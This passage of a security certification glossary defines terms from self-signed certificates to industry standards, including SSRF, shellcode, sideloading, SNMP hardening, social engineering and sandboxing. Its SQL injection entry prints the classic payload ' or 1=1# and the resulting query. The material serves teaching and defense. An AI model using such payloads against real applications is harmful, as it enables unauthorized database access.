In some circumstances, using PKI can be too difficult or expensive to manage. Any machine, web server, or program code can be deployed with a self-signed certificate. For example, the web administrative interfaces of consumer routers are often only protected by a self-signed certificate. Self-signed certificates can also be useful in development and test environments. The operating system or browser will mark self-signed certificates as untrusted, but a user can choose to override this. The nature of self-signed certificates makes them very difficult to validate. They should not be used to protect critical hosts and applications.
SELinux - The default context-based permissions scheme provided with CentOS and Red Hat Enterprise Linux.
Sender Policy Framework (SPF) - A DNS record identifying hosts authorized to send mail for the domain.

Sender Policy Framework (SPF) is an email authentication method that helps detect and prevent sender address forgery commonly used in phishing and spam emails. SPF works by verifying the sender's IP address against a list of authorized sending IP addresses published in the DNS TXT records of the email sender's domain. When an email is received, the receiving mail server checks the SPF record of the sender's domain to verify the email originated from one of the pre-authorized systems.
Sensitive Data - This label is usually used in the context of personal data privacy-sensitive information about a subject that could harm them if made public and could prejudice decisions made about them if referred to by internal procedures. As defined by the EU's General Data Protection Regulation (GDPR), sensitive personal data includes religious beliefs, political opinions, trade union membership, gender, sexual orientation, racial or ethnic origin, genetic data, and health information.
Server-Side Request Forgery (SSRF) - An attack where an attacker takes advantage of the trust established between the server and the resources it can access, including itself.

A server-side request forgery (SSRF) causes a server application to process an arbitrary request that targets another service. The target service could be another application running on the same host or a service running on a remote host. SSRF exploits both the lack of authentication between the internal servers and services. It also relies on weak input validation, which allows the attacker to submit arbitrary requests.

SSRF attacks are often targeted against cloud infrastructure where the web server is only the public-facing component of a deeper processing chain. A typical web application comprises multiple layers of servers, with a client interface, middleware logic layers, and a database layer. Requests initiated from the client interface (a web form) are likely to require multiple requests and responses between the middleware and back-end servers. These will be implemented as HTTP header requests and responses between each server. SSRF is a means of accessing these internal servers by causing the public server to execute requests on them. While with CSRF an exploit only has the privileges of the client, with SSRF the manipulated request is made with the server's privilege level.
Serverless Computing - Features and capabilities of a server without needing to perform server administration tasks. Serverless computing offloads infrastructure management to the cloud service provider—for example, configuring file storage capability without the requirement of first building and deploying a file server.

Serverless computing is a cloud computing model in which the cloud provider manages the infrastructure and automatically allocates resources as needed, charging only for the actual usage of the application. In this approach, organizations do not need to manage servers and other infrastructure, allowing them to focus on developing and deploying applications.

Some examples of serverless computing applications include chatbots designed to simulate conversations with human users to automate customer support, sales, marketing tasks, and mobile backends. These are comprised of the server-side components of mobile applications designed to provide data processing, storage, communication services, and event-driven processing that respond to events or triggers in real time such as sensor readings, alerts, or other similar events. Major cloud providers like Amazon Web Services (AWS), Microsoft Azure, and Google Cloud offer serverless computing capabilities, making it easier for organizations to leverage this technology. Serverless computing provides a scalable, cost-effective, and easy-to-manage infrastructure for event-driven and data-processing tasks.

With serverless, all the architecture is hosted within a cloud, but unlike "traditional" virtual private cloud (VPC) offerings, services such as authentication, web applications, and communications aren't developed and managed as applications running on VM instances within the cloud. Instead, the applications are developed as functions and microservices, each interacting with other functions to facilitate client requests. Billing is based on execution time rather than hourly charges. Examples of this type of service include AWS Lambda, Google Cloud Functions, and Microsoft Azure Functions.

Serverless platforms eliminate the need to manage physical or virtual server instances, so there is little to no management effort for software and patches, administration privileges, or file system security monitoring. There is no requirement to provision multiple servers for redundancy or load balancing. As all of the processing is taking place within the cloud, there is little emphasis on the provision of a corporate network. The service provider manages this underlying architecture. The principal network security job is to ensure that the clients accessing the services have not been compromised.

Serverless architecture depends heavily on event-driven orchestration to facilitate operations. For example, multiple services are triggered when a client connects to an application. The application needs to authenticate the user and device, identify the location of the device and its address properties, create a session, load authorizations for the action, use application logic to process the action, read or commit information from a database, and log the transaction. This design logic differs from applications written in a "monolithic" server-based environment.
Service assets - Service assets are things, processes, or people that contribute to delivering an IT service.
Service Disruption - A type of attack that compromises the availability of an asset or business process. It prevents an organization from working as it does normally. This could involve an attack on their website or using malware to block access to servers and employee workstations. Service disruption can be an end in itself if the threat actor's motivation is to sow chaos or gain revenge. Service disruption can be used as a blackmail threat, or it can be used as a tactic in the pursuit of some different strategic objective.
Service Set Identifier (SSID) - A character string that identifies a particular wireless LAN (WLAN).
Service-level Agreement (SLA) - An agreement that sets the service requirements and expectations between a consumer and a provider. Defines the specific performance metrics, quality standards, and service levels expected from the vendor.
Shadow IT - Computer hardware, software, or services used on a private network without authorization from the system owner. Shadow IT refers to any IT systems, devices, software, applications, and services that are used within an organization without explicit IT department approval. This creates unmonitored attack surfaces and security risks as these systems bypass normal procurement, security analysis, and monitoring processes. The problem of shadow IT is exacerbated by the proliferation of cloud services and mobile devices, which are easy for users to obtain independently.
Shellcode - A lightweight block of malicious code that exploits a software vulnerability to gain initial access to a victim system.

This is a minimal program designed to exploit a vulnerability in the OS or in a legitimate app to gain privileges, or to drop a backdoor on the host if run as a Trojan. Having gained a foothold, this type of attack will be followed by some type of network connection to download additional tools.
Sideloading - Installing an app to a mobile device without using an app store.

The practice of "sideloading" applications refers to installing applications from sources other than the official app store of the platform, such as Google's Play Store for Android or Apple's App Store for iOS. While sideloading allows for greater software flexibility and choice, it poses significant risks as sideloaded apps do not undergo the same scrutiny and vetting process as those on official app stores. This makes it easier for malicious apps to be installed, potentially leading to data theft, privacy breaches, and other issues.

Additionally, apps that require excessive access permissions can raise significant security and privacy concerns. App permissions should align with the app's purpose. Apps with excessive permissions may access sensitive user data without a legitimate need, including personal information, corporate data, contacts, call logs, location data, or device identifiers. Granting unnecessary permissions to apps increases the device's attack surface and the potential for security vulnerabilities.
Sideloading, Rooting, and Jailbreaking - Mobile devices introduce unique security vulnerabilities related to their operation, specialized software, ubiquity, and ability to store and collect vast amounts of personal and professional data.

Rooting and jailbreaking are methods used to gain elevated privileges and access to system files on mobile devices. This allows users to bypass certain restrictions imposed by the device manufacturer or operating system.

1. Rooting (Gaining superuser-level access over an Android-based mobile device) - Involves gaining root access or administrative privileges on an Android device to modify system files, install custom ROMs (modified operating system versions), and access features and settings not available to regular users.

2. Jailbreaking (Removes the protective seal and any OS-specific restrictions to give users greater control over the device) - While this term can apply to any device, it is primarily used to describe gaining full access to an iOS device (iPhone or iPad) by removing the limitations imposed by Apple's iOS operating system. Jailbreaking allows users to install unauthorized apps, customize the device's appearance and behavior, access system files, and bypass restrictions implemented by Apple.

The practice of sideloading (Installing an app to a mobile device without using an app store) applications refers to installing applications from sources other than the official app store of the platform, such as Google's Play Store for Android or Apple's App Store for iOS. While sideloading allows for greater software flexibility and choice, it poses significant risks as sideloaded apps do not undergo the same scrutiny and vetting process as those on official app stores. This makes it easier for malicious apps to be installed, potentially leading to data theft, privacy breaches, and other issues.

Additionally, apps that require excessive access permissions can raise significant security and privacy concerns. App permissions should align with the app's purpose. Apps with excessive permissions may access sensitive user data without a legitimate need, including personal information, corporate data, contacts, call logs, location data, or device identifiers. Granting unnecessary permissions to apps increases the device's attack surface and the potential for security vulnerabilities.

Rooting, sideloading, and jailbreaking offer users greater control and flexibility over their devices, but they also introduce many risks for organizations. Rooting, sideloading, and jailbreaking can weaken the security measures implemented by the device manufacturer and operating system and make it easier for attackers to exploit vulnerabilities, install malware, or gain unauthorized access to sensitive corporate information. By enabling access to unverified app stores or installing apps from unofficial sources, there is an increased risk of downloading malicious or compromised applications.

Sideloading is generally associated with Android devices utilizing APK (Android Application Package) files. While applications can also be sideloaded on Apple devices, the practice directly violates Apple's terms and conditions. Voiding a device's licensing terms eliminates official support from the manufacturer, meaning the device may no longer receive security patches, bug fixes, or updates, leaving it vulnerable to new threats and exploits.

"Right to Repair" laws and the European Union's "Digital Markets Act" are challenging many of the software, licensing, and hardware protections that limit the ability to repair or reprogram devices.

Organizations operating in regulated industries such as healthcare or finance should implement strict policies prohibiting rooting, sideloading, and jailbreaking due to the increased risk of data breaches and compliance violations. 

Mobile Device Management (MDM) platforms can detect and restrict rooting, jailbreaking, and sideloading. Regular employee education and awareness programs are also crucial to ensure employees understand the risks associated with these actions and adhere to the organization's mobile security policies.

Mobile devices are often susceptible to the same types of vulnerabilities impacting desktop computers, such as insecure Wi-Fi connections, phishing attacks, and unpatched software vulnerabilities. Given their portable nature, mobile devices are also more likely to be lost or stolen, potentially exposing any unencrypted data stored on the device.
Signature-Based Detection - A network monitoring system that uses a predefined set of rules provided by a software vendor or security personnel to identify events that are unacceptable.

Signature-based detection (or pattern-matching) means that the engine is loaded with a database of attack patterns or signatures. If traffic matches a pattern then the engine generates an incident.

The signatures and rules (often called plug-ins or feeds) powering intrusion detection need to be updated regularly to provide protection against the latest threat types. Commercial software requires a paid-for subscription to obtain the updates. It is important to configure software to update only from valid repositories, ideally using a secure connection method such as HTTPS.
Simple Authentication and Security Layer (SASL) - It means the client and server negotiate the use of a supported authentication mechanism, such as Kerberos. The STARTTLS command can be used to require encryption (sealing) and message integrity (signing). This is the preferred mechanism for Microsoft's Active Directory (AD) implementation of LDAP.
Simple Mail Transfer Protocol (SMTP) - Application protocol used to send mail between hosts on the Internet. Messages are sent between servers over TCP port 25 or submitted by a mail client over secure port TCP/587.
Simple Network Management Protocol Security - The Simple Network Management Protocol (SNMP - Application protocol used for monitoring and managing network devices. SNMP works over UDP ports 161 and 162 by default) is a widely used framework for management and monitoring. SNMP consists of an SNMP monitor and agents.

1. The agent is a process (software or firmware) running on a switch, router, server, or other SNMP-compatible network device.

2. This agent maintains a database called a management information base (MIB) that holds statistics relating to the activity of the device (for example, the number of frames per second handled by a switch). The agent is also capable of initiating a trap operation where it informs the management system of a notable event (port failure, for instance). The threshold for triggering traps can be set for each value. Device queries take place over port 161 (UDP); traps are communicated over port 162 (also UDP).

3. The SNMP monitor (a software program) provides a location from which network activity can be overseen. It monitors all agents by polling them at regular intervals for information from their MIBs and displays the information for review. It also displays any trap operations as alerts for the network administrator to assess and act upon as necessary.

If SNMP is not used, it should be disabled. When running SNMP, the following includes some important guidelines:

1. SNMP community names are sent in plaintext and so should not be transmitted over the network if there is any risk that they could be intercepted.

2. Use difficult-to-guess community names; never leave the community name blank or set to the default.

3. Use access control lists to restrict management operations to known hosts (that is, restrict to one or two host IP addresses).

4. Use SNMP v3 whenever possible, and disable older versions of SNMP. SNMP v3 supports encryption and strong user-based authentication. Instead of community names, the agents are configured with a list of usernames and access permissions. When authentication is required, SNMP messages are signed with a hash of the user's passphrase. The agent can verify the signature and authenticate the user using its own record of the passphrase.
Simple Object Access Protocol (SOAP) - An XML-based web services protocol that is used to exchange messages.
Simulation Testing/Experiment - A testing technique that replicates the conditions of a real-world disaster scenario or security incident.

Simulations are controlled experiments replicating real-world scenarios, allowing organizations to assess their incident response processes and system resilience under realistic conditions. These tests can reveal potential bottlenecks, inefficiencies, or vulnerabilities that might not be apparent in less complex tests. For instance, a simulation might involve a cyberattack targeting the organization's network infrastructure to evaluate the effectiveness of security measures and the ability to detect, contain, and remediate the threat.
Simultaneous Authentication of Equals (SAE) - Personal authentication mechanism for Wi-Fi networks introduced with WPA3 to address vulnerabilities in the WPA-PSK method. It replaces the Pre-Shared Key (PSK) exchange protocol in WPA2, ensuring an attacker cannot intercept the Wi-Fi password even when capturing data from a successful login.
Single Certificate Authority (CA) - A simple model where a single root CA issues certificates directly to users and computers, often used on private networks. In this simple model, a single root CA issues certificates directly to users and computers. This single CA model is often used on private networks. The problem with this approach is that the single CA server is very exposed. If it is compromised the whole PKI collapses.
Single Loss Expectancy (SLE) - The amount that would be lost in a single occurrence of the risk factor. This is determined by multiplying the value of the asset by an exposure factor (EF). EF is the percentage of the asset value that would be lost . For example, it may be determined that a tornado weather event will damage 40% of a building . The exposure factor in this case is 40% because only part of the asset is lost. If the building is worth $200,000, this event SLE is 200,000*0.4 or $80,000.
Single Point of Failure - A component or system that would cause a complete interruption of a service if it failed.

If a critical automated system or process fails, it could impact multiple areas of the organization, causing widespread problems.
Single Sign-on (SSO) - Authentication technology that enables a user to authenticate once and receive authorizations for multiple services.

A single sign-on (SSO) system allows the user to authenticate in one system and receive authorizations on integrated application servers without having to enter credentials again.
Sinkhole - A DoS attack mitigation strategy that directs the traffic that is flooding a target IP address to a different network for analysis.
Site Layout, Fencing, and Lighting - Physical Security Through Environmental Design
Physical security through environmental design is an approach to security that uses the built environment to enhance security and prevent crime. This approach designs physical spaces, buildings, and landscapes to promote nonobvious security features. Physical security via environmental design can be used in various settings, such as residential neighborhoods, commercial districts, schools, and public spaces. By incorporating these design principles, organizations can enhance security, deter criminal activity, and promote a sense of safety and well-being among users. Additionally, physical security via environmental design can be a cost-effective way to improve security because it easily incorporates design elements into new or existing structures at a low cost.

Barricades and Entry/Exit Points
A barricade is something that prevents access. As with any security system, no barricade is completely effective; a wall may be climbed, or a lock may be picked. The purpose of barricades is to channel people through defined entry and exit points. Each entry point should have an authentication mechanism so that only authorized persons are allowed through. Effective surveillance mechanisms ensure the detection of attempts to penetrate a barricade by other means.

Physical sites at risk of a terrorist attack will use barricades such as bollards and security posts to prevent vehicles from speeding toward a building.

Fencing
The exterior of a building may be protected by fencing (A security barrier designed to prevent unauthorized access to a site perimeter). Security fencing needs to be transparent (so guards can see any attempt to penetrate it), robust (so that it is difficult to cut), and secure against climbing (which is generally achieved by making it tall and possibly by using razor wire). Fencing is generally effective, but the drawback is that it gives a building an intimidating appearance. Buildings that are used by companies to welcome customers or the public may use more discreet security methods.

Lighting
Security lighting (Physical security mechanisms that ensure a site is sufficiently illuminated for employees and guests to feel safe and for camera-based surveillance systems to work well) is enormously important in the perception that a building is safe and secure at night. Well-designed lighting helps to make people feel safe, especially in public areas or enclosed spaces, such as parking garages. Security lighting also acts as a deterrent by making intrusion more difficult and surveillance (whether by camera or guard) easier. The lighting design needs to account for overall light levels, the lighting of particular surfaces or areas (allowing cameras to perform facial recognition, for instance), and avoid areas of shadow and glare.

Bollards
Bollards (Sturdy vertical post installed to control road traffic or designed to prevent ram-raiding and vehicle-ramming attacks) are generally short vertical posts made of steel, concrete, or other similarly durable materials and installed at intervals around a perimeter or entrance. Sometimes bollards are nonobvious and appear as sculptures or as building design elements. They can be fixed or retractable, and some models can be raised or lowered remotely. Bollards can serve several purposes, such as protecting pedestrians from vehicular traffic, preventing unauthorized vehicle access, and providing perimeter security for critical infrastructure and facilities. They are often used to secure government buildings, airports, stadiums, store entrances, and other public spaces. By preventing vehicles from entering restricted areas, bollards can help mitigate the risks of vehicular attacks and accidents.

Existing Structures
There may be a few options to adjust the site layout in existing premises. When faced with cost constraints and the need to reuse existing infrastructure, incorporating the following principles can be helpful:

1. Locate secure zones, such as equipment rooms, as deep within the building as possible, avoiding external walls, doors, and windows.

2. Use a demilitarized zone design for the physical space. Position public access areas so that guests do not pass near secure zones. Security mechanisms in public areas should be highly visible to increase deterrence.
Site Survey - Documentation about a location for the purposes of building an ideal wireless infrastructure; it often contains optimum locations for wireless antenna and access point placement to provide the required coverage for clients and identify sources of interference.
Skimming (RFID) - Making a duplicate of a contactless access card by copying its access token and programming a new card with the same data.

This refers to using a counterfeit reader to capture card or badge details, which are then used to program a duplicate. Some types of proximity cards can quite easily be made to transmit the credential to a portable RFID reader that a threat actor could conceal on their person.
SMiShing - A form of phishing that uses SMS text messages to trick a victim into revealing information. A phishing attack that uses simple message service (SMS) text communications as the vector. Direct messages to a single contact have a high chance of failure. Other social engineering techniques still use spoofed resources, such as fake sites and login pages, but rely on redirection or passive methods to entrap victims.
SMS (Message-Based Vector) - The file or a link to the file is sent to a mobile device using the text messaging handler built into smartphone firmware and a protocol called Signaling System 7 (SS7). SMS and the SS7 protocol are associated with numerous vulnerabilities. Additionally, an organization is unlikely to have any monitoring capability for SMS as it is operated by the handset or subscriber identity module (SIM) card provider.
Snapshot - Used to create the entire architectural instance/copy of an application, disk, or system. It is often used in backup processes to provide rollback points that can restore the system or disk of a particular device to a specific time. While snapshots assist in backup strategies, they are not the same as image backups and depend on the original data.

Snapshots play a vital role in data protection and recovery, capturing the state of a system at a specific point in time. Virtual Machine (VM), filesystem, and Storage Area Network (SAN) snapshots are three different types, each targeting a particular level of the storage hierarchy.

1. VM Snapshots - Such as those created in VMware vSphere or Microsoft Hyper-V, capture the state of a virtual machine, including its memory, storage, and configuration settings. This allows administrators to roll back the VM to a previous state in case of failures, data corruption, or during software testing.

2. Filesystem Snapshots - Like those provided by ZFS or Btrfs, capture the state of a file system at a given moment, enabling users to recover accidentally deleted files or restore previous versions of files in case of data corruption.

3. SAN Snapshots- Are taken at the block-level storage layer within a storage area network. Examples include snapshots in NetApp or Dell EMC storage systems, which capture the state of the entire storage volume, allowing for rapid recovery of large datasets and applications.

By utilizing VM, filesystem, and SAN snapshots, organizations can enhance their data protection and recovery strategies, ensuring the availability and integrity of their data across different storage layers and systems.
Social Engineering - Using persuasion, manipulation, or intimidation to make the victim violate a security policy. The goal of social engineering might be to gain access to an account, gain access to physical premises, or gather information.

Social engineering refers to means of either eliciting information from someone or getting them to perform some action for the threat actor. It can also be referred to as "hacking the human." A threat actor might use social engineering to gather intelligence as reconnaissance in preparation for an intrusion or to effect an actual intrusion by obtaining account credentials or persuading the target to run malware. There are many diverse social engineering strategies, but to illustrate the concept, consider the following scenarios:

1. A threat actor creates an executable file that prompts a network user for their password and then records whatever the user inputs. The attacker then emails the executable file to the user with the story that the user must open the file and log on to the network again to clear up some login problems the organization has been experiencing that morning. After the user complies, the attacker now has access to their network credentials.

2. A threat actor contacts the help desk pretending to be a remote sales representative who needs assistance setting up remote access. Through a series of phone calls, the attacker obtains the name/address of the remote access server and login credentials, in addition to phone numbers for remote access and for accessing the organization's private phone and voice-mail system.

3. A threat actor triggers a fire alarm and then slips into the building during the confusion and attaches a monitoring device to a network port.
Soft Authentication Token - OTP sent to a registered number or email account or generated by an authenticator app as a means of two-step verification when authenticating account access.

A soft authentication token is a one-time password generated by the identity provider and transmitted to the supplicant. The OTP could be sent to a registered phone number as an SMS/text message or sent to an email account. This method is more likely to use counter-based tokens, though they will still have an expiry period.

Soft tokens sent via SMS or email do not really count as an ownership factor. These systems can be described as two-step verification rather than MFA. The tokens are highly vulnerable to interception.

A more secure soft OTP token can be generated using an authenticator app. This is software installed on a computer or smartphone. The user must register each identity provider with the app, typically using a scannable quick response (QR) code to communicate the shared secret. When prompted to authenticate, the user must unlock the authenticator app with their device credential to view the OTP token. There is less risk of interception than with an SMS or email message, but as it runs on a shared-use device, there is the possibility that malware could compromise the app.
Software as a Service (SaaS) - A cloud service model that provisions fully developed application services to users.

Software as a service (SaaS) is a model of provisioning software applications. Rather than purchasing software licenses for a given number of seats, a business accesses software hosted on a supplier's servers on a pay-as-you-go or lease arrangement (on-demand). The virtual infrastructure allows developers to provision on-demand applications much more quickly than previously. The applications are developed and tested in the cloud without the need to test and deploy on client computers. Examples include Microsoft Office 365, Salesforce, and Google G Suite.
Software Composition Analysis (SCA) - Tools designed to assist with identification of third-party and open-source code during software development and deployment.
Software Defined Networking (SDN) - APIs and compatible hardware/virtual appliances allowing for programmable network appliances and systems.

IaC is partly facilitated by physical and virtual network appliances that are fully configurable via scripting and APIs. As networks become more complex—perhaps involving thousands of physical and virtual computers and appliances—it becomes more difficult to implement network policies, such as ensuring security and managing traffic flow.

With so many devices to configure, it is better to take a step back and consider an abstract model of how the network functions. In this model, network functions can be divided into three "planes":

1. Management plane- Monitors traffic conditions and network status.

2. Control plane - Makes decisions about how traffic should be prioritized, secured, and where it should be switched.

3. Data plane - Handles the switching and routing of traffic and imposition of security access controls.

A software-defined networking (SDN) application can be used to define policy decisions on the control plane. These decisions are then implemented on the data plane by a network controller application, which interfaces with the network devices using APIs. The interface between the SDN applications and the SDN controller is described as the "northbound" API, while that between the controller and appliances is the "southbound" API. SDN can be used to manage compatible physical appliances, but also virtual switches, routers, and firewalls. The architecture supporting the rapid deployment of virtual networking using general-purpose VMs and containers is called network functions virtualization (provisioning virtual network appliances, such as switches, routers, and firewalls, via VMs and containers).

This architecture saves network and security administrators the job and complexity of configuring appliance settings properly to enforce a desired policy. It also allows for fully automated deployment (or provisioning) of network links, appliances, and servers. This makes SDN an important part of the latest automation and orchestration technologies.
Software Development Life Cycle (SDLC) - The processes of planning, analysis, design, implementation, and maintenance that often govern software and systems development.

SDLC policies govern software development within an organization. These policies provide a structured plan detailing the stages of development from initial requirement analysis to maintenance after deployment. It ensures that all software produced meets the organization's efficiency, reliability, and security standards.
Software Sandboxing - A computing environment that is isolated from a host system to guarantee that the environment runs in a controlled, secure fashion. Communication links between the sandbox and the host are usually completely prohibited so that malware or faulty software can be analyzed in isolation and without risk to the host.

Sandboxing is a security mechanism used in software development and operation to isolate running processes from each other or prevent them from accessing the system they are running on. A sandbox is a protection feature designed to control a program so it runs with highly restrictive access. This containment strategy reduces the potential impact of malicious or malfunctioning software, making it effective for improving system security and stability and mitigating risks associated with software.

A practical example of sandboxing is implemented in modern web browsers, like Google Chrome, which separates each tab and extension into distinct processes. If a website or browser extension in one browser tab attempts to run malicious code, it is confined within that tab's sandbox. This action prevents malicious code from impacting the entire browser or underlying operating system. Similarly, if a tab crashes, it doesn't cause the whole browser to fail, improving reliability.

Operating systems also utilize sandboxing to isolate applications. For example, iOS and Android use sandboxing to limit each application's actions. An app in a sandbox can access its own data and resources but cannot access other app data or any nonessential system resources without explicit permission. This approach limits the damage caused by poorly written or malicious apps.

Virtual machines (VMs) and containers like Docker offer another example of sandboxing at a larger scale. Each VM or container can run in isolation, separated from the host and each other. The others remain unaffected if one VM or container experiences a security breach or system failure.

Sandboxing in Security Operations
Sandboxing tools are pivotal in security operations and analysis, particularly in detecting and understanding malware activities via forensic inspection. Sandboxing tools create an enclosed, controlled environment that allows the safe execution (also referred to as detonation) of potentially harmful software without jeopardizing the integrity of the IT environment.

Examples of such tools include Cuckoo Sandbox, an open-source system that runs files within an isolated environment and scrutinizes their behavior, logging crucial activities like system calls and network traffic.

Another important tool is Joe Sandbox, which does not require setup or installation in the organization's environment but can be accessed via a web browser. Joe Sandbox leverages several analysis techniques, including machine learning, to examine software.
Software-Defined Wide Area Network (SD-WAN) - Services that use software-defined mechanisms and routing policies to implement virtual tunnels and overlay networks over multiple types of transport network.

A Software-Defined Wide Area Network (SD-WAN) enables organizations to connect their various branch offices, datacenters, and cloud infrastructure over a wide area network (WAN). One of the key advantages of SD-WAN is its ability to provide enhanced security features and considerations. For example, SD-WAN uses encryption to protect data as it travels across the network and can segment network traffic based on priority ratings to ensure that critical data is fully protected.

Additionally, SD-WAN can intelligently route traffic based on the application and tightly integrate with firewalls to provide additional protection against known threats. SD-WAN centralizes the management of network security policies to simplify enforcing security measures across an entire network.
Something You Are - Something you are refers to a biometric or inherence factor. A biometric factor uses either physiological identifiers, such as a fingerprint or facial scan, or behavioral identifiers, such as the way someone moves (gait). The identifiers are scanned and recorded as a template.
Something You Have - Something you have is an ownership factor. It means that the account holder possesses something that no one else does, such as a smart card, key fob, or smartphone that can generate or receive a cryptographic token.
Something You Know - Something you know is a knowledge factor. It means authentication is based on information that only the authorized user should possess, such as a password, passphrase, or personal identification number (PIN). This could also include answers to security questions or a memorized pattern.
Somewhere You Are - Somewhere you are means the system applies a location-based factor to an authentication decision. Location-based authentication measures some statistics about where you are. This could be a geographic location measured using a device's location service, or its Internet Protocol (IP) network address.
SPAN (Switched Port Analyzer) / Mirror Port - Copying ingress and/or egress communications from one or more switch ports to another port. This is used to monitor communications passing over the switch. This means that the sensor is attached to a specially configured mirror port on a switch that receives copies of frames addressed to nominated access ports (or all the other ports). This method is not completely reliable. Frames with errors will not be mirrored, and frames may be dropped under heavy load.
Spyware - Software that records information about a PC and its users, often installed without the user's consent.

This is malware that can perform adware-like tracking, but also monitor local application activity, take screenshots, and activate recording devices, such as a microphone or webcam. Another spyware technique is to perform DNS redirection to pharming sites.
SQL Injection (SQLi) - An attack that injects a database query into the input data directed at a server by accessing the client side of the application.

Where an overflow attack works against the way a process performs memory management, an injection attack exploits some unsecure way in which the application processes requests and queries. For example, an application might allow a user to view their profile with a database query that should return the single record for that one user's profile. An application vulnerable to an injection attack might allow a threat actor to return the records for all users, or to change fields in the record when they are only supposed to be able to read them.

A web application is likely to use Structured Query Language (SQL) to read and write information from a database. The main database operations are performed by SQL statements for selecting data (SELECT), inserting data (INSERT), deleting data (DELETE), and updating data (UPDATE). In a SQL injection attack, the threat actor modifies one or more of these four basic functions by adding code to some input accepted by the app, causing it to execute the attacker's own set of SQL queries or parameters. If successful, this could allow the attacker to extract or insert information into the database or execute arbitrary code on the remote system using the same privileges as the database application.

For example, consider a web form that is supposed to take a name as input. If the user enters "Bob," the application runs the following query:

SELECT * FROM tbl_user WHERE username = 'Bob'

If a threat actor enters the string ' or 1=1# and this input is not sanitized, the following malicious query will be executed:

SELECT * FROM tbl_user WHERE username = '' or 1=1#

The logical statement 1=1 is always true, and the # character turns the rest of the statement into a comment, making it more likely that the web application will parse this modified version and dump a list of all users.
SSH FTP (SFTP) and FTP Over SSL (FTPS) - Secure File Transfer Protocol (SFTP - A secure version of the File Transfer Protocol that uses a Secure Shell (SSH) tunnel as an encryption method to transfer, access, and manage files) addresses privacy and integrity issues of FTP by encrypting the authentication and data transfer between client and server. In SFTP, a secure link is created between the client and server using Secure Shell (SSH) over TCP port 22. Ordinary FTP commands and data transfer can then be sent over the secure link without the risk of eavesdropping or on-path attacks. This solution requires an SSH server that supports SFTP and SFTP client software.

Another means of securing FTP is to use the connection security protocol SSL/TLS. There are two means of doing this:

1. Explicit TLS (FTPES) - Uses the AUTH TLS command to upgrade an unsecure connection established over port 21 to a secure one. This protects authentication credentials. The data connection for the file transfers can also be encrypted (using the PROT command).

2. Implicit TLS (FTPS)- Negotiates an SSL/TLS tunnel before the exchange of any FTP commands. This mode uses the secure port 990 for the control connection.
FTPS is tricky to configure when there are firewalls between the client and server. Consequently, FTPES is usually the preferred method.
SSL/TLS Versions - While the acronym SSL is still used, the Transport Layer Security versions are the only ones that are safe to use. A server can provide support for legacy clients, but obviously this is less secure. For example, a TLS 1.2 server could be configured to allow clients to downgrade to TLS 1.1 or 1.0 or even SSL 3.0 if they do not support TLS 1.2.

A downgrade attack is where an on-path attack tries to force the use of a weak cipher suite and SSL/TLS version.

TLS version 1.3 was approved in 2018. One of the main features of TLS 1.3 is the removing the ability to perform downgrade attacks by preventing the use of unsecure features and algorithms from previous versions. There are also changes to the handshake protocol to reduce the number of messages and speed up connections.
Stakeholders - A person who has a business interest in the outcome of a project or is actively involved in its work.
Standard Configurations - In an IaC architecture, the property that an automation or orchestration action always produces the same result, regardless of the component's previous state.

Maintaining system security when new hardware or infrastructure items are added to the network can be achieved by enforcing standard configurations across the company. With automated configurations, these newly added items can be kept up to date and secure.
Standard Naming Convention - Applying consistent names and labels to assets and digital resources/identities within a configuration management system.

A standard naming convention makes the environment more consistent for hardware assets and for digital assets such as accounts and virtual machines. The naming strategy should allow administrators to identify the type and function of any particular resource or location at any point in the configuration management database (CMDB) or network directory. Each label should conform to rules for host and DNS names. As well as an ID attribute, the location and function of tangible and digital assets can be recorded using attribute tags and fields or DNS CNAME and TXT resource records.
Standard Operating Procedures (SOPs) (Change Management) - These are detailed, written instructions that describe how to carry out routine operations or changes. In change management, SOPs ensure that changes are implemented consistently and effectively. They are generally developed during testing phases and provide detailed steps for employees tasked with implementing a change to help reduce errors.
Standards - Expected outcome or state of a task that has been performed in accordance with policies and procedures. Standards can be determined internally, or measured against external frameworks.

Standards define the expected outcome of a task, such as a particular configuration state for a server, or performance baseline for a service. The selection and application of standards within an organization center on various dynamic elements such as regulatory requirements, business-specific needs, risk management strategies, industry practices, and stakeholder expectations.

Regulatory requirements are the primary driver for adopting standards. The unique operational differences between organizations dictate varying legal requirements and security, privacy, and data protection regulations. These requirements often require implementing specific standards or using guidelines for achieving compliance. The healthcare industry in the United States is a classic example, where providers must comply with stringent data protection and privacy standards established by the Health Insurance Portability and Accountability Act (HIPAA).

Depending on the nature of its operations, customer base, or technological dependencies, each organization must adopt standards that specifically address its needs. For example, organizations heavily utilizing credit card transactions will adopt the PCI DSS standard to safeguard the cardholder data environment (CDE). Similarly, cloud-reliant organizations often prefer adopting ISO/IEC 27017 and ISO/IEC 27018 to ensure safe and secure cloud operations.

Risk management strategies organizations stress the need for appropriate standards. Standards help identify, evaluate, and manage risks and fortify the organization's resilience against security incidents or data breaches. ISO/IEC 27001, for example, provides a comprehensive framework for an information security management system (ISMS) designed to aid organizations in effectively managing security risks. Adherence to industry best practices also influences the adoption of standards. Conforming to widely accepted and tested standards demonstrates an organization's commitment to upholding high security and data protection levels to bolster the organization's reputation and build trust with customers and partners. Stakeholder expectations (such as customers, partners, vendors, investors, executive boards, etc.) significantly influence the choice of standards too. Stakeholders view adherence to recognized standards as an affirmation of the organization's dedication to quality, security, and reliability.

The choice of standards should not be a procedural decision but instead a strategic one. The selection of standards involves a thoughtful balance of legal and regulatory requirements, business-specific needs, risk management protocols, industry best practices, and stakeholder expectations. Adopting standards impacts how a business operates, and selecting appropriate standards helps an organization run more effectively. In contrast, adopting the wrong standards, or failing to plan the implementation of standards properly, can have severe negative consequences.

Industry Standards
Common industry standards used by public and private organizations include the following:

1. ISO/IEC 27001 - An international standard that provides an information security management system (ISMS) framework to ensure adequate and proportionate security controls are in place.

2. ISO/IEC 27002 - This is a companion standard to ISO 27001 and provides detailed guidance on specific controls to include in an ISMS.

3. ISO/IEC 27017 - An extension to ISO 27001 and specific to cloud services.

4. ISO/IEC 27018 - Another addition to ISO 27001, and specific to protecting personally identifiable information (PII) in public clouds.

5. NIST (National Institute of Standards and Technology) Special Publication 800-63 - A US government standard for digital identity guidelines, including password and access control requirements.

6. PCI DSS (Payment Card Industry Data Security Standard) - A standard for organizations that handle credit cards from major card providers, including requirements for protecting cardholder data.

7. FIPS (Federal Information Processing Standards) - FIPS are standards and guidelines developed by NIST for federal computer systems in the United States that specify requirements for cryptography.

